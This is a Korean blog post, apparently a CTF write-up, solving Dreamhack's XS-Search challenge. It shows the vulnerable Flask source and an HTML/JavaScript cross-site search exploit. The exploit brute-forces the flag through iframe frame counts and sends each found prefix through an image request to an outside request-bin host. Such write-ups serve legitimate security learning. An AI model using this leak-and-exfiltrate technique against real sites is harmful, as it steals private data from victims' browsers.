---
title: (37) Dreamhack XS-Search 문제 풀이
date: 2024-02-14 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
플래그는 `DH{[0123456789abcdef]{32}}`의 포맷입니다.

## 문제 풀이
이번 문제는 개인 서버를 이용하거나 html 호스팅을 해주는 사이트를 이용해야 풀 수 있는 문제입니다. 포트포워딩하시고 직접 서버 여셔도 됩니다.
![](https://kyuyeop.github.io/assets/img/post/37/1.png)
사이트에 들어온 모습입니다.
![](https://kyuyeop.github.io/assets/img/post/37/2.png)
search 페이지 입니다. 여기에 뭔가를 입력하면
![](https://kyuyeop.github.io/assets/img/post/37/3.png)
이렇게 뭔가 나옵니다.
![](https://kyuyeop.github.io/assets/img/post/37/4.png)
이런 페이지가 나오기도 합니다.
![](https://kyuyeop.github.io/assets/img/post/37/5.png)
submit에서는 주소를 입력하는 창이 보입니다.  
  
뭘 하는건지 잘 모르겠으니 코드를 확인해 봅시다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
from selenium.common.exceptions import TimeoutException
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from hashlib import md5
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

notes = {
    (FLAG, True), 
    ("Hello World", False), 
    ("DreamHack", False), 
    ("carpe diem, quam minimum credula postero", False)
}

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get(url)
    except TimeoutException as e:
        driver.quit()
        return True
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


@app.route("/")
def index():
    return render_template('index.html')


@app.route('/search')
def search():
    query = request.args.get('query', None)
    if query == None:
        return render_template("search.html", query=None, result=None)
    for note, private in notes:
        if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
            continue
        if query != "" and query in note:
            return render_template("search.html", query=query, result=note)
    return render_template("search.html", query=query, result=None)


@app.route("/submit", methods=["GET", "POST"])
def submit():
    if request.method == "GET":
        return render_template("submit.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        if not urlparse(url).scheme.startswith("http"):
            return '<script>alert("wrong url");history.go(-1);</script>'
        if not read_url(url):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


app.run(host="0.0.0.0", port=8000)
```
search페이지는 `notes`에서 일치하는게 있다면 찾아주는 모양입니다. `localhost`로 들어갔을때는 FLAG를 포함해서 검색하네요.  
`/submit`을 보니 url을 post로 받고, http로 시작하는 url이면 `read_url`함수를 호출해 서버에서 해당 페이지에 방문하도록 만듭니다.  
  
사이트를 보면 일치하는 검색결과가 있으면 내용을 iframe으로 보여줍니다.  
따라서 서버가 search페이지에 방문해서 검색을 한 후, iframe의 개수를 세어 봤을때 0이 아니라면 일치하는 결과가 있다고 생각할 수 있습니다.  
  
이를 이용해서 서버가 iframe을 이용해 search페이지를 로드하고 그 내용을 받아올 수 있으면 문제를 풀 수 있습니다. 아래는 드림핵에서 제공하는 코드입니다.~~(제 코드보다 깔끔해서 들고왔습니다)~~
```html
<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;
            iframe.onload = () => { 
                if (iframe.contentWindow.frames.length != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    }

    async function search(query) {
        try {
            await req(
              `http://localhost:8000/search?query=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }

    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{";

        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://gkiikjh.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }

    exploit();
</script>
```
코드를 해석하면 `0123456789abcdef}`를 돌면서 한번씩 넣어보고 맞는게 있다면 `secret`에 찾은 문자를 추가하고 `<img id="img" src="">`를 이용해 외부로 요청을 보냅니다. 같은 과정을 반복하면서 `}`가 나올때까지 while을 돌립니다.  
  
위 내용을 `index.html`로 저장하고 서버를 열고 submit페이지에 제 서버의 주소를 넣었습니다.  
  
그러면 드림핵의 로그에 flag가 찍혀나오는걸 볼 수 있습니다.
![](https://kyuyeop.github.io/assets/img/post/37/6.png)
근데 보시면 나오다가 말았습니다. 이유는 드라이버가 3초 동안만 페이지를 로드 하기 때문입니다. 위에서 얻은 내용을 `secret`변수에 추가해줍니다.
```javascript
    async function exploit() {
        let chars = "0123456789abcdef}"
        let secret = "DH{22d1445ad68e1";

        while (!secret.includes("}")) {
            for (let c of chars) {
                if (await search(secret + c)) {
                    secret += c;
                    img.src = `https://bdtmaue.request.dreamhack.games/${secret}`;
                    break;
                }
            }
        }
    }
```
이 과정을 두번 정도 반복해주면
![](https://kyuyeop.github.io/assets/img/post/37/7.png)
flag를 얻을 수 있습니다.
{% endraw %}